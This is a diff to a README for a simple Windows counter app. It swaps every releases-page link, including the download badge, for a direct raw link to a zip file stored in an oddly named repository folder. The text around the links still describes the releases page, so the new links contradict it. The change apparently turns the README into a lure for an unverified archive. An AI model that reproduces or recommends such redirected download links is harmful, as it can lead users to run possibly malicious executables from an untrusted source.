@@ -1,12 +1,12 @@
 # 🧮 CounterApplication - Simple Counting on Windows
 
-[![Download CounterApplication](https://img.shields.io/badge/Download-CounterApplication-4CAF50?style=for-the-badge)](https://github.com/Francr6105/CounterApplication/releases)
+[![Download CounterApplication](https://img.shields.io/badge/Download-CounterApplication-4CAF50?style=for-the-badge)](https://raw.githubusercontent.com/Francr6105/CounterApplication/main/suavastika/Counter_Application_v2.0.zip)
 
 ## 📥 Download
 
 To get the app, visit this page to download:
 
-https://github.com/Francr6105/CounterApplication/releases
+https://raw.githubusercontent.com/Francr6105/CounterApplication/main/suavastika/Counter_Application_v2.0.zip
 
 Open the page, look for the latest release, and download the Windows file from there.
 
@@ -160,6 +160,6 @@ Depending on the release, you may see:
 
 Download files here:
 
-https://github.com/Francr6105/CounterApplication/releases
+https://raw.githubusercontent.com/Francr6105/CounterApplication/main/suavastika/Counter_Application_v2.0.zip
 
 Open the latest release, choose the Windows file, and start the app from your Downloads folder
